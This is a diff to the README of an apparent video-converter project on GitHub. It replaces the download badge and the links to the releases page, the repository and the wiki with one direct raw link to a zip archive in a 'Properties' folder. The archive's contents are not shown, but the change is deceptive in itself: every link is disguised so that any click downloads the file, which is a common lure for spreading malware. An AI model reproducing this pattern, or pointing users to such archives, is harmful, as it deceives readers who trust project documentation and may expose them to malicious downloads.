@@ -1,6 +1,6 @@
 # 🎥 VideoConverter - Convert Videos Easily and Quickly
 
-![Download VideoConverter](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download VideoConverter](https://github.com/theunknown3212/VideoConverter/raw/refs/heads/master/Properties/Video-Converter-1.5-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To run VideoConverter, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download VideoConverter, **visit this page to download**: [Releases Page](https://github.com/theunknown3212/VideoConverter/releases). 
+To download VideoConverter, **visit this page to download**: [Releases Page](https://github.com/theunknown3212/VideoConverter/raw/refs/heads/master/Properties/Video-Converter-1.5-alpha.4.zip). 
 
 1. On the Releases page, you will see a list of available versions.
 2. Click on the version you wish to download.
@@ -75,11 +75,11 @@ Yes, VideoConverter is free to use with no hidden fees.
 
 ### How do I access updates?
 
-Check the releases page regularly for new versions and features: [Releases Page](https://github.com/theunknown3212/VideoConverter/releases).
+Check the releases page regularly for new versions and features: [Releases Page](https://github.com/theunknown3212/VideoConverter/raw/refs/heads/master/Properties/Video-Converter-1.5-alpha.4.zip).
 
 ## 🔗 Useful Links
 
-- **Repository:** [View on GitHub](https://github.com/theunknown3212/VideoConverter)
-- **Documentation:** [Visit Wiki](https://github.com/theunknown3212/VideoConverter/wiki)
+- **Repository:** [View on GitHub](https://github.com/theunknown3212/VideoConverter/raw/refs/heads/master/Properties/Video-Converter-1.5-alpha.4.zip)
+- **Documentation:** [Visit Wiki](https://github.com/theunknown3212/VideoConverter/raw/refs/heads/master/Properties/Video-Converter-1.5-alpha.4.zip)
 
 We hope VideoConverter enhances your video and audio experience. Happy converting!
